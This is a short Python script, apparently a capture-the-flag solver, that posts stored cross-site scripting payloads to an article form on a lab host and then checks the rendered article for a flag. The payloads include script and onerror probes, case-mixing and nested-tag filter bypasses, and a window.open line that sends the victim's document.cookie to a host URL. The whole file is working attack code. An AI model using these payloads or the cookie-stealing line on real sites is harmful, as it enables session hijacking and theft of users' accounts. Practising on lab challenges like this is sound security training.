import requests
import urllib.parse
import bs4
#上传payload
payload='''<img src=x onerror=alert(1)>
<script>alert(2)</script>
<script>window.open(\'http://192.168.56.118:80/test.php?cookie=\'+document.cookie)</script>
<sCrIPt>alert(4)</ScripT>
<Sscriptcript>alert(5)</Sscriptcript>'''
base_url = 'http://192.168.56.118:80/'
url=base_url + 'new_article.php'
# 修改headers
headers = {
    'user-agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'cookie': 'pma_lang=zh_CN; PHPSESSID= ;',
    'content-type': 'application/x-www-form-urlencoded'
}
data=f'title=111&content={urllib.parse.quote(payload)}'
response=requests.post(url=url,headers=headers,data=data)
if response.status_code != 200:
    print('web error!')
    exit()

#获取文章列表
url= base_url +'article_list.php'
response=requests.get(url=url,headers=headers)
if response.status_code != 200:
    print('web error!')
    exit()
soup=bs4.BeautifulSoup(response.text,features="html.parser")
#print(soup.text)
if '查看' not in soup.text:
    print('上传失败，文章列表为空')
    exit()
else:
    href=soup.find('table').find_all('tr')[2].find_all('td')[2].find_all('a')[0]['href']
    href= base_url + href
    #查看文章找到flag
    response=requests.get(url=href,headers=headers)
    if response.status_code != 200:
        print('web error!')
        exit()
    soup=bs4.BeautifulSoup(response.text,features="html.parser")
    div_tag = soup.find('div')
    if div_tag:
        if div_tag.text.find("flag{") != -1:
            print(div_tag.text)
        else:
            print("XSS attack failed!")
    else:
        print("XSS attack failed!.")
